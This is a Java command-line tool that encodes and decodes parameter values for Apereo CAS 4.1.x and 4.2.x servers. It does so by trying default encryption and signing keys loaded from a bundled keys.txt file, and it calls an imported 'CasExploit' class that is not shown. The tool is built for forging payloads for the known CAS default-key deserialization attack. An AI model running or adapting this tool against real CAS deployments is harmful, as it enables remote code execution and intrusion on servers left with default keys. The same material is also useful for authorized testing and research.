package com.newcodor;

import com.newcodor.util.CasExploit;

import java.io.IOException;
import java.util.Map;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.cryptacular.util.CodecUtil;

/**
 * Hello world!
 *
 */
public class App 
{
    public static List<Map<String, String>> CAS_KEYS = new ArrayList<>();

    private static void usage(){
        System.out.println("options:\n" +
                "\t-h --help show help.\n" +
                "\tencode    inputString(Hex) [OtherKey(KeyEncryption,Sign,AES)]\n" +
                "\tdecode    inputString(Base64)");
    }
    private static  void loadKeys(){
        BufferedReader reader = new BufferedReader(new InputStreamReader(App.class.getResourceAsStream("/keys.txt")));
        try {
            String line = null;
            System.out.println("[+] loading  keys from keys.txt ......");
            while ((line = reader.readLine()) != null) {
                String[] k = line.split(",");
                Map<String, String> key = new HashMap<>();
                key.put("secretKeyEncryption", k[0]);
                key.put("secretKeySigning", k[1]);
                key.put("secretKeyAl", k[2]);
                CAS_KEYS.add(key);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static void main( String[] args )
    {
        String method = "";
        String inputStr="";
        String OtherKey="";
        switch (args.length){
            case 1:
                if(args[0].trim().replaceAll("\r|\n","").equals("-h") || args[0].trim().replaceAll("\r|\n","").equals("--help")){
                    usage();
                };
                break;
            case 3:
                OtherKey = args[2].trim().replaceAll("\r|\n","");
                if(!OtherKey.contains(",")){
                    System.out.println("[-] The OtherKey should containe ','");
                    System.exit(0);
                }
            case 2:
                method=args[0].trim().replaceAll("\r|\n","");;
                inputStr = args[1].trim().replaceAll("\r|\n","");
                System.out.println("[+] function: "+method);
                System.out.println("[+] inputStr: "+inputStr);
                break;
            default:
                System.out.println("try '-h' or '--help' for more information");
                System.exit(0);
        }

        if(method.equals("decode")) {
            byte[] decodeStr = new byte[0];
            try {
                if(OtherKey.isEmpty()) {
                    System.out.println("[+] start try auto decode str .....");
                    System.out.println("[+] CAS 4.1.x decode wthout key");
                    decodeStr = CasExploit.decode(CodecUtil.b64(inputStr), null);
                    if (decodeStr.length == 0) {
                        System.out.println("\n[+] CAS 4.2.x use internal keys");
                        loadKeys();
                        for (Map<String, String> key : CAS_KEYS) {
                            try {
                                System.out.println("[+] CAS 4.2.x decode with key(Algorithm-Sign-KeyEncryption): " + String.join(",", key.values()));
//                        System.out.println(String.format("[+] decode with KeyEncryption: %s", new Object[]{ key.get("secretKeyEncryption")}));
                                decodeStr = CasExploit.decode(CodecUtil.b64(inputStr), key);
                                if (decodeStr.length != 0) {
                                    break;
                                }
                            } catch (Exception e) {
//                throw new RuntimeException(e);
                                e.printStackTrace();
                                continue;
                            }
                        }
                    }
                }else{
                    String[] k = OtherKey.split(",");
                    Map<String, String> key = new HashMap<>();
                    key.put("secretKeyEncryption", k[0]);
                    key.put("secretKeySigning", k[1]);
                    key.put("secretKeyAl", k[2]);
                    System.out.println("[+] CAS 4.2.x decode with special key(KeyEncryption-Sign-Algorithm): "+key.values());
                    decodeStr=CasExploit.decode(CodecUtil.b64(inputStr),key);
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            if (decodeStr.length == 0) {
                System.out.println("\n[+] Not found any avaible Decoder.");
            } else {
                System.out.println("[+] found result! \n" + new String(decodeStr));
                System.out.println("\nHex: "+CodecUtil.hex(decodeStr));
            }
        } else if (method.equals("encode")) {
            byte[] inputBytes=CodecUtil.hex(inputStr);
            System.out.println("[+] hex decode: "+new String(inputBytes));
            try {
                if(OtherKey.isEmpty()){
                    System.out.println("[+] CAS 4.1.x encode without key");
                    System.out.println("[+] encode result: "+CasExploit.encode(inputBytes,null));
                    System.out.println("\n[+] CAS 4.2.x use internal keys");
                    loadKeys();
                    for (Map<String, String> key : CAS_KEYS) {
                        System.out.println("[+] CAS 4.2.x encode with key(Algorithm-Sign-KeyEncryption): " + String.join(",", key.values()));
                        System.out.println(CasExploit.encode(inputBytes, key));
                    }
                }else{
                    String[] k = OtherKey.split(",");
                    Map<String, String> key = new HashMap<>();
                    key.put("secretKeyEncryption", k[0]);
                    key.put("secretKeySigning", k[1]);
                    key.put("secretKeyAl", k[2]);
                    System.out.println("[+] CAS 4.2.x encode with special key(KeyEncryption-Sign-Algorithm): "+key.values());
                    System.out.println("[+] encode result: "+CasExploit.encode(inputBytes,key));
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }





}
